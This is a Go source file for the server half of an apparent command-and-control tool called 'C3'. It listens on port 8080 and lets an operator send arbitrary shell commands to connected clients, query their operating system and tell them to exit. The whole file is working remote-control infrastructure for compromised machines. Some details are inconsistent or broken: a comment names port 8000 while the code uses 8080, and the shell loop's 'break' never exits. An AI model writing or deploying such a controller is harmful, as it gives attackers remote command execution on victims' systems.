package main

import (
	// Standard
	"bufio"
	"fmt"
	"encoding/gob"
	"net"
	"os"
	"strings"

	// C3
	"github.com/calebmatsick/C3/pkg/color"
)


func shell(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	for {
		fmt.Printf(color.Green + "[shell]: " + color.Reset)
		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')



		switch {
		case cmd == "\r":
			continue
		case cmd == "close\n":
			enc.Encode(cmd)
			break
		default:
			result := ""
			enc.Encode(cmd)
			dec.Decode(&result)
			fmt.Println(string(result))
		}
	}
	conn.Close()
}


func sysinfo(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	enc.Encode("sysinfo")

	result := ""
	dec.Decode(&result)

	switch {
	case result == "windows":
		fmt.Println("The system is running Windows")
	case result == "darwin":
		fmt.Println("The system is running MacOS")
	case result == "linux":
		fmt.Println("The system is running Linux")	
	}
}


func exit(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	enc.Encode("exit")
}


func handleConnection(conn net.Conn) {
	for {
		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		reader = strings.TrimSuffix(reader, "\n")

		switch {
		case reader == "\r\n":
			continue
		case reader == "exit":
			exit(conn)
		case reader == "shell":
			shell(conn)
		case reader == "sysinfo":
			sysinfo(conn)
		default:
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
		}
	}
}


func main() {
	fmt.Println("Start server")

	// Listen on port 8000
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot listen on given port")
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot accept connection")
		}
		go handleConnection(conn)
	}
}